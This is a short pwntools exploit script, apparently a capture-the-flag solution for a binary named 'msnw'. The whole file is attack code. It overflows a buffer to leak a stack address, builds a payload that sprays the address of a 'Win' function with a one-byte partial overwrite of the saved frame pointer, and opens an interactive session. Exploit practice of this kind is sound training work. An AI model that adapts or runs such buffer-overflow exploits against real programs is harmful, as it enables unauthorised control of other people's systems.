from pwn import *

exe = ELF("./msnw", checksec=False)
p = process("./msnw")

payload = b'a' * 304
input()
p.sendafter(b': ', payload)
p.recv(316)
leak = u64(p.recv(6) + b'\0\0')
log.info("leak: " + hex(leak))

shell = leak >> 8 & 0xff
shell = bytes([shell - 2])
print(b'shell')



payload = b""
payload += p64(exe.sym['Win']) * (0x130 // 0x8)
payload += b"\00"
payload += shell
p.sendafter(b': ', payload)
p.interactive()
